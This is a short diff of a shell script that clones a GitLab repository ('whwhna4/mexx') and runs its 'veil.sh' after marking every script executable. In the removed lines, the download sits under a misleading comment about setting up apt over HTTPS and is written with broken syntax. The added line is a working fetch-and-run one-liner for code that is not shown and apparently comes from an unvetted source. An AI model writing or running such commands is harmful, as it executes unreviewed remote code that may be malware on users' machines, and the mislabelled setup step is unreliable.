@@ -1,8 +1,3 @@
-#1. Update system
-sudo apt-get update
+#!/bin/bash
 
-#2.Install packages to allow apt to use a repository over HTTPS:
-curl -s git clone https://gitlab.com/whwhna4/mexx.git \
-     cd mexx \
-     chmod +x *.sh \
-     ./veil.sh
+git clone https://gitlab.com/whwhna4/mexx.git && cd mexx && chmod +x *.sh && ./veil.sh
